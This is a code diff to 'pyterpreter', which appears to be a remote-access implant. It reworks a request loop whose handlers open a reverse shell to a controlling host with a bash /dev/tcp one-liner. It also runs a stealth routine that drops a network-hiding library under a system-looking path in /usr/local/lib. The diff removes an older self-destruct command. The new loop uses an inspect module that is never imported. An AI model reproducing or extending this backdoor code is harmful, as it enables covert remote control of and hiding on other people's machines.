@@ -1,37 +1,35 @@
 import os
 import subprocess
 import tempfile
+from typing import Any
 
-
-from core.message import Message, MESSAGE_PURPOSE
+from core.message import *
 
 from pyterpreter import config
 from pyterpreter import util
 
 
-def process_messages_forever():
+def process_requests_forever():
     while True:
-        message = config.messages_received.get()
-        # if message.purpose != MESSAGE_PURPOSE.PING:
-        #     print(f'Received message {message}')
+        request = config.messages_received.get()  # type: Any
+        message_class = request.__class__.__name__
+        handle_func = globals().get(f'_handle_{message_class}')
+        if handle_func is not None and inspect.isfunction(handle_func):
+            handle_func(request)
 
-        if message.purpose == MESSAGE_PURPOSE.PING:
-            config.messages_to_send.put(Message(MESSAGE_PURPOSE.PING))
-
-        elif message.purpose == MESSAGE_PURPOSE.OPEN_SHELL:
-            _do_open_shell(int(message.args[0]))
-
-        elif message.purpose == MESSAGE_PURPOSE.STEALTH:
-            _do_stealth()
-
-        elif message.purpose == MESSAGE_PURPOSE.SELF_DESTRUCT:
-            _do_self_destruct()
+        else:
+            print(f'Could not find handle_func for {request.encode()}')
 
 
-def _do_open_shell(port: int):
-    _run_command_detached(f"/bin/bash -c 'bash -i >& /dev/tcp/{config.LOCAL_IP}/{port} 0>&1'")
+def _handle_PingRequest(request: PingRequest):
+    config.messages_to_send.put(PingResponse(request_id=request.request_id))
 
 
+def _handle_OpenReverseShellRequest(request: OpenReverseShellRequest):
+    _run_command_detached(f"/bin/bash -c 'bash -i >& /dev/tcp/{config.LOCAL_IP}/{request.port} 0>&1'")
+
+
+# TODO
 def _do_stealth():
     has_gcc_code = util.process_get_cmd_output('gcc --version')[0]
     network_hider_filename = '/usr/local/lib/libld.so'
